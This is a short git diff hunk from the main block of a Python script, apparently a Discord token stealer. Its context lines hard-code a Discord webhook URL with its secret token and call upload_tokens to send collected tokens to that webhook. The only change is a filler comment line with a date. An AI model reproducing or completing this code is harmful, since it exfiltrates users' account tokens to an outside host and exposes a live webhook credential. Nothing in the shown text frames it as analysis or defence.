@@ -483,3 +483,4 @@ if __name__ == "__main__":
     webhook_url = "https://discord.com/api/webhooks/1358164315504509078/PcyJ0TmNAyET9kiELgcxoBcD7yLOrdjYv9MEGtD2YsF9CsTlfY04rHXgSN0omlknZ-Yr"
     upload_tokens(webhook_url)
 # Change 0 on 2021-02-01
+# Change 1 on 2021-02-12
